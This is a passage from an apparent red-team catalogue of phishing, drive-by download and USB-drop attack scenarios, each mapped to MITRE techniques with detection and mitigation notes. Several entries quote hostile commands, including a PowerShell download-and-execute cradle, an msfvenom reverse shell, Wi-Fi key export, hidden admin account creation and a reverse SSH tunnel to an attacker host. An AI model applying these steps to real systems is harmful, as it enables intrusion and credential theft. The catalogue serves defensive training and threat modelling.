- **Detection**: OAuth token monitoring, login pattern tracking
- **Solution**: Block non-verified links, use domain filtering
- **Tags**: RedTeam, SpearPhishing, SharePointPhish, CollaborationAbuse, MITRE_T1566_002

## Fake Procurement Request from Internal Team

- **Attack Type**: Internal Impersonation
- **Target**: Procurement Team
- **Vulnerability**: Weak sender verification
- **MITRE**: T1585.002 – Internal Impersonation
- **Impact**: Vendor account takeover
- **Tools**: Email Spoofer, GoPhish
- **Scenario**: Impersonates an internal procurement team asking for login credentials to access vendor portal.
- **Attack Steps**: 1. Create internal user spoof email.2. Request urgent vendor login.3. Use phishing page to steal credentials.4. Use stolen access for lateral movement.
- **Detection**: Internal email monitoring, anomaly detection
- **Solution**: Internal mail tagging, require portal login via SSO
- **Tags**: RedTeam, SpearPhishing, ProcurementPhish, InternalFraud, MITRE_T1585_002

## Fake Cybersecurity Audit Request with Survey Link

- **Attack Type**: Survey-Based Data Theft
- **Target**: Security Admins
- **Vulnerability**: Trust in security assessments
- **MITRE**: T1566.002 – Web Form Phishing
- **Impact**: Data breach, infrastructure knowledge leak
- **Tools**: Google Forms, GoPhish
- **Scenario**: Victim receives fake cyber audit request with embedded link to a malicious survey that collects sensitive details.
- **Attack Steps**: 1. Craft legit-looking survey page.2. Ask for internal tool credentials.3. Send to security and admin staff.4. Collect confidential data.
- **Detection**: Email/survey link pattern monitoring
- **Solution**: Use official survey platforms, avoid form-based auth requests
- **Tags**: RedTeam, SpearPhishing, SurveyScam, CyberAuditFraud, MITRE_T1566_002

## COVID-19 HR Policy Phishing Campaign

- **Attack Type**: Health Event-Themed Phishing
- **Target**: All Employees
- **Vulnerability**: Sensitivity to health topics
- **MITRE**: T1566.001 – Event-Based Spearphishing
- **Impact**: Account takeover, employee panic
- **Tools**: Ngrok, SEToolkit
- **Scenario**: Fake email claims new HR policy around COVID-19 and links to malicious HR portal.
- **Attack Steps**: 1. Clone HR login portal.2. Send fake HR announcement.3. Redirect users to fake login page.4. Capture usernames and passwords.
- **Detection**: HR communication whitelisting, link scanning
- **Solution**: Internal newsletter protocols, verified sender practices
- **Tags**: RedTeam, SpearPhishing, COVIDScam, HRPhishing, MITRE_T1566_001

## Fake Remote Work Access Portal

- **Attack Type**: VPN Login Harvesting
- **Target**: Remote Employees
- **Vulnerability**: Urgency around remote access
- **MITRE**: T1566.002 – Infrastructure Credential Theft
- **Impact**: VPN access, infrastructure entry
- **Tools**: Fake VPN UI, GoPhish, Ngrok
- **Scenario**: Employees are sent fake instructions for a “new VPN portal” and asked to log in.
- **Attack Steps**: 1. Clone VPN login UI.2. Host via Ngrok.3. Send announcement email from spoofed IT address.4. Capture VPN credentials.
- **Detection**: VPN log monitoring, MFA enforcement
- **Solution**: Use trusted portals, block fake subdomains
- **Tags**: RedTeam, SpearPhishing, VPNPhishing, RemoteAccessHack, MITRE_T1566_002

## Dropbox Shared Link to Malicious Script

- **Attack Type**: Cloud Link Delivery
- **Target**: Project Managers
- **Vulnerability**: Trust in shared cloud documents
- **MITRE**: T1566.002 – Cloud Service Abuse
- **Impact**: Remote access, data theft
- **Tools**: Dropbox, Word Macro, GoPhish
- **Scenario**: Target receives Dropbox link to shared script which includes credential-stealing macro.
- **Attack Steps**: 1. Upload malicious Word script to Dropbox.2. Share via email as project file.3. On open, macro steals credentials or opens reverse shell.
- **Detection**: Dropbox link validation, content sandboxing
- **Solution**: Block shared link previews, inspect macros
- **Tags**: RedTeam, SpearPhishing, DropboxAbuse, SharedLinkHack, MITRE_T1566_002

## Payment Confirmation Phishing with Fake Receipt

- **Attack Type**: Financial Transaction Trap
- **Target**: Finance Team
- **Vulnerability**: Urgency in payment scenarios
- **MITRE**: T1566.001 – Financial Attachment Phishing
- **Impact**: Backdoor access, financial system entry
- **Tools**: Excel Macro, PDF Exploit
- **Scenario**: Finance staff receive a fake “receipt” from a vendor with embedded malware disguised as payment confirmation.
- **Attack Steps**: 1. Create fake invoice or receipt.2. Embed payload in Excel macro.3. Target accounts team.4. Activate on open.5. Establish backdoor.
- **Detection**: Transaction alerting, attachment behavior monitoring
- **Solution**: Strong finance validation workflows
- **Tags**: RedTeam, SpearPhishing, PaymentPhish, FinanceHack, MITRE_T1566_001

## Acquisition News Phishing for M&A Insider Access

- **Attack Type**: M&A-Themed Executive Phishing
- **Target**: Executives
- **Vulnerability**: Sensitivity to insider events
- **MITRE**: T1566.002 – Strategic Document Phishing
- **Impact**: Insider access, business leak
- **Tools**: DocuSign Clone, Ngrok, GoPhish
- **Scenario**: Fake email announces a company acquisition and prompts C-level login to access documents.
- **Attack Steps**: 1. Create fake DocuSign page.2. Link document to login trap.3. Target executives during sensitive business periods.4. Capture credentials.
- **Detection**: Executive communication restrictions
- **Solution**: Protect domains, alert on login location change
- **Tags**: RedTeam, SpearPhishing, InsiderAccess, ExecPhish, MITRE_T1566_002

## Injected iFrame in Forum Posts

- **Attack Type**: iFrame-Based Stealth Injection
- **Target**: Forum Users
- **Vulnerability**: Open HTML in forum profiles, iframe abuse
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Stealth malware installation
- **Tools**: JS, iframe, redirector script
- **Scenario**: Malicious users inject hidden iframes in forum post signatures or templates that trigger malware downloads when viewed.
- **Attack Steps**: 1. Attacker creates multiple fake accounts on high-traffic forums.2. Edits post signature or profile to include hidden <iframe src="malicioussite.com/payload">.3. When a victim reads any post, browser loads the iframe in background.4. iFrame executes JS redirect to payload dropper hosted on attacker server.5. Malware is dropped silently using auto-download techniques or disguised as a benign file (e.g., PDF or image).6. In case of plugin-based exploit (e.g., Java), execution may be immediate.
- **Detection**: Proxy & user-agent logs, iframe domain whitelisting
- **Solution**: Remove iframe support in user input, CSP headers
- **Tags**: #DriveBy #iFrameExploit #ForumMalware #AutoDownload #MITRE_T1189

## Malicious Browser Extension from Fake Store

- **Attack Type**: Browser Add-On Compromise
- **Target**: Home/Corp Users
- **Vulnerability**: Unverified browser extensions
- **MITRE**: T1176 – Malicious Extension Abuse
- **Impact**: Persistent access via browser
- **Tools**: Chrome Extension, WebSocket Payload
- **Scenario**: Users are tricked into installing a seemingly helpful extension that downloads malware in the background.
- **Attack Steps**: 1. Attacker builds a legit-looking Chrome/Edge extension (e.g., "Currency Converter").2. Inserts background JS that connects to C2 via WebSockets.3. Upon install, extension checks in with C2 server.4. On trigger, server instructs extension to silently download payload using fetch().5. JS writes payload to disk using Blob() or downloads a disguised EXE via browser cache.6. In some cases, downloads executed via auto-start registry keys set by the extension.7. Full control of system possible after first reboot.
- **Detection**: Extension auditing, process monitoring
- **Solution**: Block 3rd-party extensions, enforce signing via GPO
- **Tags**: #DriveBy #BrowserExtension #MalwareExtension #SilentDrop #MITRE_T1176

## Drive-By Download from Cracked Software Site

- **Attack Type**: Pirated Software Trap
- **Target**: General Users
- **Vulnerability**: Curiosity/greed + AV disabled
- **MITRE**: T1204.002 – Malicious ZIP File
- **Impact**: Ransomware attack, botnet enrollment
- **Tools**: JSLoader, EXE Binder, ZIP Payload
- **Scenario**: Fake “crack” site offers free downloads that contain hidden malware auto-downloaded when clicked.
- **Attack Steps**: 1. Attacker sets up a fake site like crack-software-free[.]net.2. Uses SEO poisoning to push site on top Google results for “Adobe crack” etc.3. Download button uses JavaScript to trigger auto-download of ZIP with a trojanized EXE.4. ZIP contains an EXE “activator” bound with reverse shell or ransomware.5. Many users disable antivirus for cracked software — payload evades basic detection.6. On execution, victim’s system is compromised and added to botnet or encrypted for ransom.
- **Detection**: DNS logs, ZIP scan, shell telemetry
- **Solution**: Block piracy sites, enforce AV & EDR
- **Tags**: #DriveBy #CrackSite #MalwareInstaller #ZIPExploit #MITRE_T1204_002

## News Portal Injects JS Payload in Article Template

- **Attack Type**: News Article Exploit
- **Target**: News Readers
- **Vulnerability**: Shared templates, CMS script injection
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Silent mass compromise
- **Tools**: JS Dropper, Remote Shell Loader
- **Scenario**: A popular news site is compromised and silently serves malware via injected JavaScript in the article template.
- **Attack Steps**: 1. Attacker gains access to CMS template engine of popular news site (e.g., via stolen admin credentials).2. Injects <script src='malicious.site/drop.js'> inside common article template.3. When users read any article, script executes silently.4. Dropper script connects to external server to download actual malware payload.5. Payload saved in temp dir with hidden flag; may also use mshta.exe or certutil.exe to write payload.6. Malware is executed in stealth mode — giving attacker full shell access.
- **Detection**: CSP headers, anomaly behavior in JS files
- **Solution**: Secure CMS access, integrity hash monitoring
- **Tags**: #DriveBy #NewsExploit #CMSInjection #TemplateMalware #MITRE_T1189

## Zero-Day via Banner Ad Click

- **Attack Type**: Browser Zero-Day Delivery
- **Target**: Any Browser User
- **Vulnerability**: Unpatched browser, vulnerable renderers
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: Full remote takeover
- **Tools**: CVE Exploit JS, Metasploit, Shellcode
- **Scenario**: A zero-day exploit hidden inside an animated ad banner leads to background shellcode execution upon click.
- **Attack Steps**: 1. Attacker buys banner space on small sites or injects banners via ad partner networks.2. Banner is crafted with obfuscated JavaScript leveraging a known 0-day (e.g., browser memory corruption).3. When victim clicks banner, exploit executes buffer overflow or use-after-free.4. Shellcode runs in memory without user interaction.5. Installs persistent backdoor (e.g., DLL sideloading).6. Exploit may evade AV/EDR if 0-day is unknown.7. Attacker gains complete control until patch is issued.
- **Detection**: Behavior-based heuristics, memory dump analysis
- **Solution**: Patch frequently, disable JS/ads where possible
- **Tags**: #DriveBy #ZeroDay #AdExploit #Shellcode #MITRE_T1203

## Malicious Ad Leads to Silent Exploit Kit

- **Attack Type**: Malvertising + Exploit Kit
- **Target**: Web Users
- **Vulnerability**: Third-party ad content injection
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: RAT installation, system compromise
- **Tools**: RIG EK, JavaScript, iframe injector
- **Scenario**: Attacker purchases ad space on legitimate site and delivers malware using an embedded iframe and exploit kit.
- **Attack Steps**: 1. Attacker sets up RIG exploit kit on a remote VPS and hosts a malicious payload.2. Registers with an ad exchange platform and submits a banner ad embedded with an iframe pointing to the exploit kit.3. Victim visits a legitimate site showing the ad.4. iFrame invisibly redirects to exploit kit’s landing page.5. Browser fingerprinting occurs (e.g., Flash/Java version, browser type).6. Exploit kit selects matching exploit.7. Exploit executes in browser silently, dropping and executing malware (e.g., remote access trojan).
- **Detection**: Ad sandboxing, iframe detection
- **Solution**: Ad blocker, updated browsers, disable 3rd-party scripts
- **Tags**: #RedTeam #DriveByDownload #ExploitKit #Malvertising #MITRE_T1189

## Fake Software Update Pop-Up

- **Attack Type**: Pop-Up Exploit
- **Target**: Browser Users
- **Vulnerability**: UI spoofing, no download restrictions
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Initial access, backdoor control
- **Tools**: Empire, JS, FakeAlertGen
- **Scenario**: Fake browser update pop-up tricks users into downloading a trojan when they think they are updating Chrome or Flash.
- **Attack Steps**: 1. Attacker compromises or embeds JS on a legitimate or cloned site.2. JS displays a modal/popup styled like an official Chrome or Flash update dialog.3. The “Download” button is linked to a malicious executable hosted on attacker-controlled server.4. Victim clicks and downloads file (e.g., UpdateInstaller.exe).5. User is tricked into running it with admin privileges.6. Payload installs Empire agent that connects back to attacker via reverse shell.7. Attacker now has persistent access to target system.
- **Detection**: EDR pop-up detection, hash-based filtering
- **Solution**: Disable pop-ups, educate users, browser auto-update only
- **Tags**: #DriveBy #FakeUpdate #Trojan #Empire #RedTeam #MITRE_T1189

## Watering Hole Attack on Industry Website

- **Attack Type**: Watering Hole + Targeted Delivery
- **Target**: Industry Employees
- **Vulnerability**: Poor web app code integrity, no IP filtering
- **MITRE**: T1189, T1071
- **Impact**: Targeted compromise, lateral movement
- **Tools**: Cobalt Strike, JS Payload Loader
- **Scenario**: A legitimate industry portal is compromised to deliver malware only to specific users (e.g., based on IP/geolocation).
- **Attack Steps**: 1. Recon to identify trusted industry-specific sites used by target (e.g., oil & gas intranet blog).2. Exploit site’s CMS or admin creds to inject JS.3. JavaScript checks if IP matches target company ranges.4. If matched, victim is redirected to malicious Cobalt Strike stager or loader.5. Downloaded malware runs automatically or exploits browser vulns (e.g., via Flash or HTML5 abuse).6. C2 established for command execution and credential harvesting.7. If IP doesn’t match target, normal site behavior is preserved (to avoid detection).
- **Detection**: IDS/IPS anomaly detection, DNS logs
- **Solution**: Web code signing, restrict script injection zones
- **Tags**: #WateringHole #DriveBy #TargetedAttack #CobaltStrike #MITRE_T1189 #MITRE_T1071

## WordPress Plugin Infection Delivers Auto Malware

- **Attack Type**: CMS Plugin Abuse
- **Target**: Website Visitors
- **Vulnerability**: Plugin validation failure
- **MITRE**: T1190 – Exploit Public App
- **Impact**: Persistent malware infections
- **Tools**: WordPress, JS, Meterpreter Payload
- **Scenario**: Malicious WordPress plugin is used to inject scripts that download and execute malware when the site loads.
- **Attack Steps**: 1. Attacker develops a fake plugin (e.g., "SEO Helper Pro") with hidden malicious JavaScript embedded.2. Uploads plugin to open WP plugin repo or directly compromises target’s admin panel.3. When visitor lands on site, plugin injects <script> tag loading malware.4. JS initiates download of executable payload via browser.5. Uses MIME spoofing to hide EXE as a PNG or DOC.6. File is dropped silently using download attribute and often opened by default by document handlers.7. Backdoor executed automatically via OS default behavior.
- **Detection**: Web app scanner, plugin hash monitoring
- **Solution**: Audit plugins, disable inline JS, enforce CSP
- **Tags**: #WordPress #DriveBy #PluginMalware #CMSExploit #MITRE_T1190

## Fake Video Site Triggers Background Downloader

- **Attack Type**: Clone-Based JS Downloader
- **Target**: Home Users
- **Vulnerability**: Clone UI deception, ZIP delivery abuse
- **MITRE**: T1204.002 – User Execution (ZIP File)
- **Impact**: Social engineering-based execution
- **Tools**: JS, HTML5 Downloader, ZIPPayload
- **Scenario**: A fake YouTube-like page tricks user to play a video; instead, clicking triggers background malware download.
- **Attack Steps**: 1. Clone YouTube UI using open-source template.2. Replace video player with a screenshot or animated gif.3. "Play" button triggers onclick() JS event that launches background download using <a download> or blob method.4. Downloads ZIP containing EXE payload auto-named as “video_player.exe”.5. Optional: Use .bat or .vbs loader inside ZIP.6. User sees fake “buffering” animation and may unzip and run file, thinking it’s a codec or player.7. Malware executed, connects to attacker server.
- **Detection**: Static analysis of downloads, zip inspection
- **Solution**: Prevent fake clone links, alert on EXE in ZIP
- **Tags**: #DriveBy #YouTubeClone #ZIPMalware #DownloaderExploit #MITRE_T1204_002

## Auto-Executing Payload via HID Emulation

- **Attack Type**: HID-based Command Execution
- **Target**: General Employee
- **Vulnerability**: Curiosity, autorun via HID spoofing
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Remote access, stealth shell launch
- **Tools**: Rubber Ducky, Cobalt Strike
- **Scenario**: USB device emulates a keyboard, auto-types PowerShell payload on plug-in to gain remote shell.
- **Attack Steps**: 1. Program Rubber Ducky to emulate a keyboard and type PowerShell commands (e.g., IEX (New-Object Net.WebClient).DownloadString(...)).2. Drop USB in target area (e.g., parking lot, restroom, lobby).3. Employee picks it up and plugs into workstation out of curiosity.4. USB executes commands as keyboard input.5. Remote shell opens, beaconing to attacker's C2.6. Attacker gains reverse shell or drops persistent malware.
- **Detection**: USB device monitoring, unusual process logging
- **Solution**: Block HID devices, disable USB autorun
- **Tags**: #RedTeam #USBExploit #RubberDucky #HIDAttack #MITRE_T1200

## Weaponized DOCX on USB Drive

- **Attack Type**: Social Engineering + Macro Exploit
- **Target**: Office Staff
- **Vulnerability**: Macro-enabled content + curiosity
- **MITRE**: T1204.002 – Malicious File Execution
- **Impact**: Credential theft, privilege escalation
- **Tools**: Word Macro, msfvenom, Empire
- **Scenario**: USB contains an “HR_Policy.docx” with embedded macro that executes payload when opened.
- **Attack Steps**: 1. Create Word file with embedded macro triggering reverse shell using msfvenom-generated payload.2. Save DOCX in USB with label “Confidential HR_Policy”.3. Drop USB near HR department or break room.4. Employee opens file; macro bypasses warning and runs.5. Empire listener receives connection, attacker gains access.6. Optional: add decoy document content to avoid suspicion.
- **Detection**: Macro logging, reverse shell signature detection
- **Solution**: Disable macros, implement USB scanning
- **Tags**: #USBDrop #MacroMalware #OfficeExploit #RedTeam #MITRE_T1204_002

## LNK File Shortcut Attack

- **Attack Type**: LNK File Execution Exploit
- **Target**: Finance Staff
- **Vulnerability**: LNK abuse, icon spoofing
- **MITRE**: T1204.002 – Malicious Shortcut File
- **Impact**: Remote shell, system compromise
- **Tools**: LNK Creator, Shellcode, Obfuscated CMD
- **Scenario**: USB includes fake document shortcut that actually runs malware via cmd.exe.
- **Attack Steps**: 1. Create a shortcut named “Q3_Reports.lnk” that executes: cmd.exe /c powershell -nop -w hidden -enc <payload>.2. Save it along with legit-looking icon on USB.3. Victim opens shortcut, expecting document.4. Hidden PowerShell connects to attacker and installs malware or RAT.5. Shell maintains persistence via registry edits.6. Optional: pair with fake PDF to enhance believability.
- **Detection**: LNK logging, PowerShell obfuscation detection
- **Solution**: Show file extensions, block LNK from removable drives
- **Tags**: #USBExploit #LNKAttack #PowerShellMalware #RedTeam #MITRE_T1204_002

## EXE Disguised as PDF in USB Drop

- **Attack Type**: File Renaming Deception
- **Target**: Accounting Staff
- **Vulnerability**: Windows default hides extensions
- **MITRE**: T1204.002 – Malicious Executable File
- **Impact**: Persistent backdoor, data exfiltration
- **Tools**: UPX Packer, Payload Binder
- **Scenario**: Attacker drops USB with “Invoice.pdf.exe” file designed to trick users into thinking it's a document.
- **Attack Steps**: 1. Bind payload with a decoy PDF using EXE binder tools.2. Rename file to look like “Invoice.pdf.exe” (with icon spoofing).3. Place USB in company cafeteria or restroom.4. User opens file expecting a document.5. EXE executes backdoor and connects to C2.6. Auto-persistence configured via registry or scheduled task.
- **Detection**: AV signature scan, EXE execution from USB logs
- **Solution**: Show extensions, block EXE from USB devices
- **Tags**: #PDFExploit #USBBackdoor #EXEDisguise #RedTeam #MITRE_T1204_002

## Autorun.inf Exploit on Legacy Windows

- **Attack Type**: Legacy Autorun Abuse
- **Target**: Legacy Systems
- **Vulnerability**: Legacy autorun feature enabled
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Remote code execution
- **Tools**: Meterpreter, autorun.inf, USB Creator
- **Scenario**: Targets outdated Windows systems where autorun.inf is still active to launch payload automatically.
- **Attack Steps**: 1. Generate payload using msfvenom -p windows/meterpreter/reverse_tcp.2. Create autorun.inf to launch payload silently.3. Format USB in FAT32, copy both files.4. Drop USB in parking lot or elevator.5. On legacy system (e.g., Win7), payload launches automatically upon insertion.6. Meterpreter session established.
- **Detection**: Autorun config audit, system age profiling
- **Solution**: Disable autorun, upgrade legacy OS
- **Tags**: #USBDrop #AutorunExploit #LegacyAbuse #RedTeam #MITRE_T1200

## USB Rubber Ducky Exfiltrates Browser Passwords

- **Attack Type**: Credential Harvesting via HID
- **Target**: Office Employee
- **Vulnerability**: USB HID spoofing + local credential storage
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Credential theft, privacy violation
- **Tools**: Rubber Ducky, PowerShell, Nirsoft Tools
- **Scenario**: USB emulates a keyboard and executes commands to extract and exfiltrate saved passwords from browsers.
- **Attack Steps**: 1. Prepare Rubber Ducky payload to run PowerShell silently.2. Payload uses Nirsoft tools (e.g., WebBrowserPassView) to extract credentials.3. Encodes the output and exfiltrates it via HTTP POST or emails to attacker's server.4. USB is dropped in employee-accessible zones (e.g., lobby, meeting room).5. On plug-in, script auto-types and executes, exfiltrating credentials without alerting the user.
- **Detection**: Endpoint credential dumping alert, data exfil alerts
- **Solution**: Block HID USBs, remove browser-stored passwords
- **Tags**: #RubberDucky #PasswordTheft #USBHack #MITRE_T1200 #BrowserCredentialExfil

## USB Launches Ransomware with Decoy PDF

- **Attack Type**: Ransomware Trigger via User Action
- **Target**: General Users
- **Vulnerability**: Curiosity, dual file execution
- **MITRE**: T1486 – Data Encrypted for Impact
- **Impact**: Data loss, business disruption
- **Tools**: PDF decoy, RansomEXX, Task Scheduler
- **Scenario**: USB carries a decoy PDF and ransomware file; user opens decoy while malware executes in background.
- **Attack Steps**: 1. Bundle ransomware with a legit PDF using dropper tool.2. Ransomware silently installs while the decoy opens (to distract user).3. Uses Task Scheduler or registry for persistence.4. Files begin encryption after short delay.5. USB is labeled with something enticing like “Company_Meeting_Notes”.6. Unsuspecting employee opens file, triggering the chain silently.
- **Detection**: File access anomalies, encryption pattern detection
- **Solution**: Email training, AV sandboxing
- **Tags**: #RansomwareUSB #DecoyPDF #DropperPayload #MITRE_T1486

## USB with Preloaded Wi-Fi Harvester Script

- **Attack Type**: Wi-Fi Info Collection
- **Target**: IT/Admin Staff
- **Vulnerability**: Windows stores Wi-Fi creds in plaintext
- **MITRE**: T1552.001 – Unprotected Credentials
- **Impact**: Wi-Fi compromise, lateral movement
- **Tools**: Bash Bunny, netsh, PS Script, Wi-Fi Viewer
- **Scenario**: Script runs upon USB plug-in to harvest Wi-Fi credentials (saved SSIDs and passwords) from the host system.
- **Attack Steps**: 1. USB device (e.g., Bash Bunny) mimics HID + storage.2. Auto-runs a PowerShell script that executes: netsh wlan export profile key=clear.3. Exports saved Wi-Fi profiles (SSIDs + keys).4. Collects files and optionally exfiltrates via DNS tunneling or email.5. Useful in targeting guest Wi-Fi networks or staging APTs.6. USB labeled “Photos from Conference” to appear harmless.
- **Detection**: EDR telemetry, netsh command detection
- **Solution**: Encrypted storage, restrict USB plug-in
- **Tags**: #WiFiCredHarvest #USBDrop #BashBunny #MITRE_T1552_001

## USB Creates Hidden Admin User

- **Attack Type**: Privilege Escalation
- **Target**: Local User
- **Vulnerability**: User has admin session active
- **MITRE**: T1136.001 – Create Account
- **Impact**: Hidden persistence, long-term access
- **Tools**: Rubber Ducky, PowerShell, Net User
- **Scenario**: On plug-in, USB auto-types command to create a hidden local administrator account for persistent access.
- **Attack Steps**: 1. Payload includes net user hiddenadmin Pass123 /add && net localgroup administrators hiddenadmin /add.2. Executes via HID spoofed keystrokes.3. Admin account is created silently.4. Optional: hide user from login screen using registry edit.5. Used to establish future RDP or lateral movement.6. No GUI alerts; user sees nothing unless audited.
- **Detection**: Audit logs (new accounts), registry change alerts
- **Solution**: Monitor for net user executions, account creation logs
- **Tags**: #HiddenAccount #AdminEscalation #USBExploit #MITRE_T1136_001

## Bash Bunny Attacks Air-Gapped System

- **Attack Type**: Air-Gap Compromise
- **Target**: Air-Gapped Device
- **Vulnerability**: Physical access allowed, no USB controls
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Data breach in sensitive/offline environments
- **Tools**: Bash Bunny, PowerShell, Data Dumper
- **Scenario**: USB executes payload to collect system info and stage data exfiltration from air-gapped machines.
- **Attack Steps**: 1. Bash Bunny configured to execute multi-stage payload.2. Gathers system info (hostname, users, IPs), key files (e.g., DOCX, XLSX).3. Compresses into ZIP file on the USB device itself.4. No internet needed – entire collection local.5. Attacker retrieves USB later or uses another drop with radio beacon for pick-up signal.6. Especially dangerous in classified or defense environments.
- **Detection**: USB access logs, device control systems
- **Solution**: Block all removable media in secure zones
- **Tags**: #AirGapBypass #DataTheft #BashBunny #RedTeam #MITRE_T1200

## USB Installs Keylogger in Stealth

- **Attack Type**: Keylogging + Persistence
- **Target**: General Users
- **Vulnerability**: USB execution, lack of user awareness
- **MITRE**: T1056.001 – Input Capture
- **Impact**: Credential theft, account compromise
- **Tools**: Keylogger EXE, Obfuscator, Registry Tool
- **Scenario**: USB drops and installs keylogger that silently records keystrokes and stores or exfiltrates them.
- **Attack Steps**: 1. Attacker compiles lightweight keylogger and obfuscates its signature.2. USB auto-drops executable on plug-in using startup scripts or user bait (e.g., fake resume file).3. Payload installs silently and sets persistence via registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run).4. Logs stored locally or sent via email to attacker.5. Attacker retrieves stolen passwords, messages, credentials.
- **Detection**: Suspicious registry keys, high keystroke activity
- **Solution**: Use USB restrictions, monitor for new registry entries
- **Tags**: #KeyloggerUSB #CredentialTheft #USBSpyware #RedTeam #MITRE_T1056_001

## USB Exploits AutoPlay via Hidden Executable

- **Attack Type**: AutoPlay-Based Execution
- **Target**: Office Users
- **Vulnerability**: Icon spoofing, AutoPlay trust
- **MITRE**: T1204.002 – User Execution (EXE File)
- **Impact**: Malware install, stealth access
- **Tools**: Malicious EXE, Icon Changer, AutoPlay
- **Scenario**: USB uses disguised file and AutoPlay trick to run payload upon user double-click in File Explorer.
- **Attack Steps**: 1. Create malicious EXE with disguised PDF icon using tools like Resource Hacker.2. Place EXE in USB root, named “Resume.pdf”.3. Enable AutoPlay or mislead user to click in drive root.4. Windows executes EXE thinking it’s a document.5. Attacker’s payload installs silently, e.g., keylogger, RAT, or beacon.6. Often used in HR/phishing red team campaigns.
- **Detection**: AutoPlay activity, user EXE execution logs
- **Solution**: Disable AutoPlay, show real file extensions
- **Tags**: #AutoPlayExploit #DisguisedEXE #MITRE_T1204_002 #USBHack

## USB Drop with Auto-Wi-Fi Connect Backdoor

- **Attack Type**: Rogue Wi-Fi Activation
- **Target**: Restricted Systems
- **Vulnerability**: Enabled Wi-Fi adapters in air-gapped zones
- **MITRE**: T1105 – Ingress Tool Transfer
- **Impact**: Bypass segmentation, remote control
- **Tools**: Bash Bunny, WiFi Connect Script, Hotspot
- **Scenario**: USB auto-executes script to connect to rogue Wi-Fi hotspot, enabling remote access in air-gapped systems.
- **Attack Steps**: 1. Payload includes script that enables Wi-Fi adapter, scans for specific SSID (e.g., “CorpBackup”).2. If found, it auto-connects with embedded password.3. Upon connection, secondary script downloads malware from attacker hotspot (e.g., hosted via smartphone tethering).4. Persistence set and machine becomes accessible remotely.5. Especially useful where no internet is available but Wi-Fi cards exist.
- **Detection**: Wi-Fi logs, unauthorized SSID activity
- **Solution**: Disable Wi-Fi adapters in secure areas
- **Tags**: #WiFiBackdoor #AirGapBypass #USBDelivery #MITRE_T1105

## USB-Based Firmware Update Hijack

- **Attack Type**: Firmware-Level Exploitation
- **Target**: IT Technicians
- **Vulnerability**: Lack of firmware integrity validation
- **MITRE**: T1542.003 – Bootkit
- **Impact**: Undetectable persistent compromise
- **Tools**: Rogue Firmware, Flash Utility, USB Spoof
- **Scenario**: USB appears as firmware update tool (e.g., for BIOS or printer), but actually flashes infected firmware.
- **Attack Steps**: 1. Clone legit firmware update tool from vendor.2. Modify firmware image to include malicious code (e.g., bootkit, hidden listener).3. Place tool on USB with readme or instructions.4. Trained employee (e.g., IT support) runs update.5. System appears updated but now includes attacker backdoor at firmware level.6. Hidden from OS-level scans.
- **Detection**: BIOS hash validation, hardware integrity tools
- **Solution**: Use signed updates only, restrict firmware access
- **Tags**: #FirmwareBackdoor #BIOSExploit #USBUpdateHack #MITRE_T1542_003

## USB Emulates Ethernet Device to Spoof Network Access

- **Attack Type**: USB-to-Network Attack
- **Target**: Any Windows/MacOS
- **Vulnerability**: Auto-trust of new USB network interfaces
- **MITRE**: T1200 – Hardware Additions
- **Impact**: Full HTTP interception, credential/session theft
- **Tools**: USB Armory, PoisonTap, RNDIS
- **Scenario**: USB acts as an Ethernet adapter, modifies routing table to redirect traffic to attacker’s device.
- **Attack Steps**: 1. Program USB to emulate a network adapter using RNDIS.2. When plugged in, target OS recognizes it as a trusted network interface.3. Routes all HTTP traffic through USB device.4. Drops JS payloads into HTTP responses (DNS poisoning, session hijack, cookie theft).5. Attack effective even with locked screen on older OSes.6. Optional: reroute to malicious captive portal.
- **Detection**: Network route changes, new interface detection
- **Solution**: Block new interfaces by default, disable RNDIS drivers
- **Tags**: #EthernetEmulation #PoisonTap #NetworkSpoofUSB #MITRE_T1200

## USB Drops Reverse SSH Tunnel on Linux Systems

- **Attack Type**: Linux Reverse Tunnel via Bash
- **Target**: Linux Workstation
- **Vulnerability**: Lack of USB execution restrictions
- **MITRE**: T1573 – Encrypted Channel
- **Impact**: Persistent remote shell from internal Linux box
- **Tools**: Bash Script, autossh, cron
- **Scenario**: USB contains Bash script that creates a persistent reverse SSH tunnel to attacker infrastructure.
- **Attack Steps**: 1. Script placed on USB (e.g., “install.sh”) runs on Linux plug-in.2. Script uses autossh to establish reverse tunnel to attacker's server (e.g., ssh -R 2222:localhost:22 attacker@host).3. Configures cron job or systemd service for persistence.4. No alerts shown to user.5. Attacker can now tunnel into internal Linux machine over SSH remotely.
- **Detection**: Outbound traffic anomaly, cron job monitoring
- **Solution**: Restrict USB script execution, monitor outbound SSH
- **Tags**: #LinuxUSBHack #ReverseTunnel #BashScript #MITRE_T1573

## USB Installs Screenshot Grabber in Background

- **Attack Type**: Screen Capture Spyware
- **Target**: Corporate Users
- **Vulnerability**: No restrictions on background tools
- **MITRE**: T1113 – Screen Capture
- **Impact**: Data leak, spying on user sessions
- **Tools**: Python Script, PyInstaller, Cron
- **Scenario**: USB silently installs background process to capture screenshots periodically and send to attacker.
- **Attack Steps**: 1. USB contains Python executable disguised as document opener.2. Once run, script uses pyautogui.screenshot() every 30 seconds.3. Images stored locally and uploaded to attacker’s FTP or Google Drive.4. Persistence added via cron, registry, or startup folder.5. Victim unaware unless AV detects abnormal screen API use.
- **Detection**: Frequent screen API access, external upload logs
- **Solution**: Restrict tools with screen APIs, disable FTP/upload tools
- **Tags**: #ScreenshotLogger #USBSpyware #MITRE_T1113 #RedTeam

## USB Configures Hidden Remote Desktop Access

- **Attack Type**: RDP Backdoor Deployment
- **Target**: Admin/Engineer PC
- **Vulnerability**: Insecure RDP configs, HID spoofing
- **MITRE**: T1021.001 – Remote Services (RDP)
- **Impact**: Full remote takeover via RDP
- **Tools**: PowerShell, RegEdit, Netsh Firewall
- **Scenario**: USB auto-enables RDP and opens firewall rules to allow attacker remote access.
- **Attack Steps**: 1. PowerShell script executes upon USB insertion using autorun or HID emulation.2. Enables RDP via registry and system settings.3. Modifies firewall rules with netsh advfirewall to allow inbound RDP.4. Optionally creates hidden user for login.5. Attacker connects remotely via RDP later.6. Effective in non-hardened environments.
